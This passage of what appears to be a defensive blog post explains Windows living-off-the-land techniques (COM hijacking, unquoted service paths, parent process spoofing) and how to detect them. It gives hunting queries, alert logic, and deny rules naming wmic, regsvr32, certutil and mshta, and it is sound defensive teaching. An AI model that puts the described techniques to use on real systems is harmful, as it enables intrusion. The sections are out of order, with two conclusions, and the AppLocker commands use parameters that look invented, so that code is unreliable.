+In 2026, the focus has shifted from "which binary" to "which trust boundary." Sophisticated operators have moved beyond simple LOLBIN execution toward abusing Windows architectural assumptions and misconfigurations.
+
+### COM Hijacking: The Stealthy Pivot (T1546.015)
+
+Component Object Model (COM) Hijacking remains one of the most high-signal LOTL techniques. It allows an attacker to intercept the execution of legitimate processes by registering a malicious CLSID (Class Identifier) in the user-level hive (`HKCU`).
+
+**Why it works in 2026**:
+- **Trust Inheritance**: When an elevated process (e.g., `explorer.exe`) calls a COM object, it may inadvertently load an attacker's DLL registered in the current user's hive.
+- **Minimal Footprint**: No new processes are spawned; the malicious code runs within the context of a legitimate, trusted process.
+- **Persistence**: Survives patches because it abuses the fundamental search order of COM activation.
+
+### Service Abuse & DLL Search Order Hijacking (T1574.001)
+
+While "magic binaries" fade, **Living-off-the-misconfiguration** thrives. Service-based attacks remain remarkably reliable:
+
+1. **Writable Service Paths**: Weak permissions on service binaries allow attackers to replace legitimate files with malicious ones.
+2. **Unquoted Service Paths**: Exploiting how Windows parses paths with spaces to execute an attacker binary (`C:\Program.exe` instead of `C:\Program Files\Service.exe`).
+3. **DLL Search Order Hijacking**: Placing a malicious DLL in a directory adjacent to a signed, elevated executable that fails to use absolute paths during load.
+
+### Token & Process Access Abuse
+
+Modern operators frequently bypass LOLBIN-based parent-child detections by manipulating process internals directly:
+
+- **Parent Process Spoofing**: Using the `STARTUPINFOEX` structure to specify a different parent for a new process (e.g., making `cmd.exe` appear to be spawned by `svchost.exe`).
+- **Token Duplication**: Stealing the access token of a high-privileged process to execute code in a more restrictive context, blending in with legitimate system activity.
+
+> [!IMPORTANT]
+> **Strategic Shift**
+> Modern LOTL is about **trust boundaries**. If you understand how trust is inherited and where boundaries are misconfigured, you'll find far more reliable "land" than any single binary can provide.
+
+<hr className="section-divider" />
+
+## Building a LOTL Detection Program
+
+### The Challenge of Baseline-Driven Detection
+
+Traditional signature-based detection fails completely against LOTL techniques. The executables are legitimate, the code is signed, and the tools are used daily by administrators. The only viable detection strategy is **behavioral analysis** based on **contextual deviation from baseline**.
+
+The fundamental question is: **Is this tool being used in a way that's normal for our environment?**
+
+### Detection Engineering Framework
+
+**Phase 1: Inventory and Baseline**
+
+Before you can detect anomalies, you must understand normal:
+
+1. **Tool Inventory**: Catalog which LOLBAS tools exist and are actively used in your environment
+2. **User Profiling**: Identify which users legitimately use each tool
+3. **Temporal Patterns**: Understand when tools are typically used (business hours vs. 3 AM)
+4. **Parent-Child Relationships**: Map normal process ancestry (what spawns what)
+5. **Command-Line Patterns**: Collect and analyze typical command-line arguments
+
+**Phase 2: Anomaly Detection Rules**
+
+Build detection rules that flag deviations from baseline:
+
+| Tool | Normal Behavior | Suspicious Behavior |
+|------|----------------|---------------------|
+| **PowerShell** | IT staff during business hours; specific service accounts | Spawned from Office apps; encoded commands from non-IT users |
+| **PsExec** | Never used (if org doesn't use it) | Any usage |
+| **WMI** | Periodic system queries; management tools | Remote process creation; event consumer creation |
+| **BITSAdmin** | SYSTEM account for Windows Update | User-initiated with SetNotifyCmdLine |
+| **Regsvr32** | Software installation by IT; infrequent | Network connections; spawned from Office apps |
+
+**Phase 3: Layered Detection**
+
+No single indicator is sufficient. Build layered detections that correlate multiple signals:
+
+```
+Alert: Suspicious PowerShell Activity
+Conditions (3 of 5 must be true):
+  1. Spawned from Office application (Word, Excel, Outlook)
+  2. Contains -EncodedCommand or -enc parameter
+  3. Makes network connection to external IP
+  4. User is not in "IT Administrators" group
+  5. Execution time is outside business hours (6 PM - 7 AM)
+```
+
+This reduces false positives while increasing confidence in true positives.
+
+**Phase 4: Threat Hunting Queries**
+
+Proactive hunting queries to discover LOTL abuse:
+
+```sql
+-- Splunk: PowerShell spawned from Office apps
+index=windows EventCode=4688 
+| where (ParentImage LIKE "%WINWORD.EXE%" OR ParentImage LIKE "%EXCEL.EXE%" OR ParentImage LIKE "%OUTLOOK.EXE%") 
+  AND NewImage LIKE "%powershell.exe%"
+| stats count by ComputerName, User, CommandLine
+
+-- Elastic: Regsvr32 with network connections
+event.code:3 AND process.name:regsvr32.exe AND destination.ip:* AND NOT destination.ip:(10.* OR 172.* OR 192.168.*)
+
+-- Sigma: WMI Event Consumer Creation
+detection:
+  selection:
+    EventID: 20
+  filter:
+    Consumer: '*CommandLineEventConsumer*'
+  condition: selection and filter
+```
+
+**Phase 5: Automated Response**
+
+Once high-confidence detections are established, consider automated containment:
+
+```powershell
+# Pseudo-code for automated response
+if (Detect_Suspicious_PowerShell_Pattern) {
+    # Isolate the endpoint from network
+    Invoke-EDR-NetworkIsolation -ComputerName $AffectedHost
+    
+    # Capture volatile evidence
+    Invoke-MemoryCapture -ComputerName $AffectedHost
+    
+    # Alert SOC
+    Send-SOCAlert -Severity Critical -Title "LOTL Attack Detected" -Details $Evidence
+    
+    # Create incident ticket
+    New-IncidentTicket -Type "LOTL/Low-Artifact Attack" -Priority P1
+}
+```
+
+### Application Whitelisting and Hardening
+
+While behavioral detection is essential, preventive controls reduce attack surface:
+
+**Windows Defender Application Control (WDAC)** can restrict LOLBAS execution:
+
+```xml
+<!-- Example WDAC policy to block LOLBAS abuse -->
+<SiPolicy xmlns="urn:schemas-microsoft-com:sipolicy">
+  <Rules>
+    <!-- Block wmic.exe for standard users -->
+    <FileRule Id="[GUID]" Action="Deny" UserOrGroupSid="S-1-5-32-545">
+      <Conditions>
+        <FilePathCondition Path="%System32%\wmic.exe" />
+      </Conditions>
+    </FileRule>
+  </Rules>
+</SiPolicy>
+```
+
+<hr className="section-divider" />
+
+## Defensive Roadmap: Implementing LOTL Detection
+
+To effectively counter LOTL attacks, organizations should prioritize the following technical controls:
+
+- [ ] **Enable Advanced Logging**:
+    - [ ] PowerShell Script Block Logging (Event ID 4104)
+    - [ ] Process Creation with Command Line (Event ID 4688)
+    - [ ] WMI Activity (Event ID 19, 20, 21 via Sysmon)
+- [ ] **Restrict Tool Access**:
+    - [ ] Block internet access for `regsvr32.exe`, `certutil.exe`, `mshta.exe`
+    - [ ] Use WDAC or AppLocker to restrict administrative tools to IT staff
+- [ ] **Baseline Behavioral Patterns**:
+    - [ ] Map normal parent processes for PowerShell and WMI
+    - [ ] Identify legitimate uses of BITS `SetNotifyCmdLine`
+- [ ] **Proactive Hunting**:
+    - [ ] Regularly audit WMI event subscriptions
+    - [ ] Monitor for unusual named pipes from PsExec and its variants
+
+## Conclusion
+
+Living off the Land represents the ultimate "evasion by design" strategy. By weaponizing tools that are already trusted, attackers force defenders to move beyond simple binary detection and into the complex world of behavioral analysis. The key to successful defense lies not in blocking these tools, which is often impossible, but in mastering the context of their use.
+
+**AppLocker** provides a more accessible (but less robust) alternative:
+
+```powershell
+# Block script execution for standard users
+New-AppLockerPolicy -RuleType Script -User "DOMAIN\Domain Users" -Action Deny -Path "*"
+
+# Allow scripts only from trusted paths
+New-AppLockerPolicy -RuleType Script -User "DOMAIN\Domain Users" -Action Allow -Path "C:\Program Files\*"
+```
+
+**Attack Surface Reduction (ASR) Rules** in Windows Defender:
+
+```powershell
+# Block Office apps from creating executable content
+Set-MpPreference -AttackSurfaceReductionRules_Ids 3B576869-A4EC-4529-8536-B80A7769E899 -AttackSurfaceReductionRules_Actions Enabled
+
+# Block Office apps from injecting into other processes
+Set-MpPreference -AttackSurfaceReductionRules_Ids 75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84 -AttackSurfaceReductionRules_Actions Enabled
+
+# Block process creations from PSExec and WMI
+Set-MpPreference -AttackSurfaceReductionRules_Ids D1E49AAC-8F56-4280-B9BA-993A6D77406C -AttackSurfaceReductionRules_Actions Enabled
+```
+
+> [!TIP]
+> **Operational Reality: ASR Coverage**
+> While powerful, ASR rules are rarely a silver bullet. In enterprise environments, exceptions for legacy software and administrative tools often erode coverage. ASR should be viewed as a **layer of friction**, not a guarantee of prevention.
+
+## Conclusion: The Cat-and-Mouse Game
+
+Living off the Land represents a fundamental shift in attacker tradecraft: one that defensive technologies are still struggling to counter effectively. By 2026, the strategy has matured from "abusing binaries" to "abusing trust inheritance." Attackers no longer just look for a way to execute code; they look for a way to inherit the trust of the operating system itself through configuration abuse and architectural flaws.
+
+This assessment is supported by observable trends:
+- Major ransomware operations (Ryuk, REvil, DoppelPaymer) have standardized on LOLBAS tools
+- Nation-state actors increasingly leverage LOTL for stealth operations
+- Red team frameworks (Cobalt Strike, Sliver, Havoc) all include LOLBAS execution modules
+- Detection vendor focus has shifted from signature-based to behavioral analytics
+
+### Key Takeaways for Defenders
+
+**1. Signature Detection Alone Is Insufficient**: Traditional antivirus signatures cannot detect malicious use of legitimate tools alone. Invest in behavioral analytics and anomaly detection.
+
+**2. Baseline Everything**: You cannot detect anomalies without understanding normal. Invest time in baselining normal PowerShell usage, WMI activity, and administrative tool behavior in your environment.
+
+**3. Context Is King**: A single indicator (like encoded PowerShell) is rarely sufficient. Build layered detections that correlate multiple contextual signals (parent process, user, time of day, network connections).
+
+**4. Reduce Attack Surface**: If your organization doesn't use PsExec, block it. If standard users don't need WMIC access, restrict it. Every LOLBAS tool you can restrict reduces the attacker's toolkit.
+
+**5. Logging Is Critical**: Enable PowerShell Script Block Logging, Sysmon for process creation and WMI events, and command-line auditing. You cannot hunt what you cannot see.
+
+**6. Hunt Proactively**: Don't wait for alerts. Conduct regular threat hunting campaigns specifically targeting LOTL techniques. Search for WMI event consumers, suspicious PowerShell patterns, and unusual process ancestry.
+
+**7. Educate and Train**: Ensure SOC analysts understand LOTL techniques and can distinguish malicious use from legitimate administration. Develop playbooks for investigating LOTL alerts.
+
+The attacker's advantage in LOTL scenarios is significant: they choose when and where to blend into normal activity. The defender's advantage is scale: by collecting comprehensive telemetry and applying statistical analysis across thousands of endpoints, patterns emerge that reveal even sophisticated LOTL campaigns.
+
+As security professionals, our mission is to make living off the land as difficult and risky for attackers as deploying custom malware. This requires a double-pronged approach: **Hardening trust boundaries** to prevent inheritance abuse, and **Advanced Behavioral Analysis** to detect the subtle deviations that occur when legitimate tools are used for illegitimate ends.
+
+The land may be familiar, but in 2026, if we watch the trust boundaries carefully enough, we'll see the footprints of those who are trying to hide in the light.
+
+---
+
+## Further Reading and Resources
+
+**LOLBAS Project**: https://lolbas-project.github.io/ - Comprehensive catalog of Living off the Land binaries and scripts
+
+**MITRE ATT&CK Framework**: 
+- T1059.001 - PowerShell
+- T1047 - Windows Management Instrumentation
+- T1546.003 - WMI Event Subscription
+- T1546.015 - COM Hijacking
+- T1574.001 - DLL Search Order Hijacking
+- T1569.002 - Service Execution
+- T1218.010 - Regsvr32
+- T1218.005 - Mshta
+- T1197 - BITS Jobs
+- T1059.003 - Windows Command Shell
+
+**CIS Controls**: 
+- Control 8: Audit Log Management
+- Control 13: Network Monitoring and Defense
+- Control 16: Application Software Security
+
+**MS-ISAC Resources**: https://www.cisecurity.org/ms-isac (membership required for full threat intelligence)
+
+**Detection Engineering**:
+- Sigma Rules Repository: https://github.com/SigmaHQ/sigma
+- Sysmon Configuration: https://github.com/SwiftOnSecurity/sysmon-config
+- HELK (Hunting ELK): https://github.com/Cyb3rWard0g/HELK
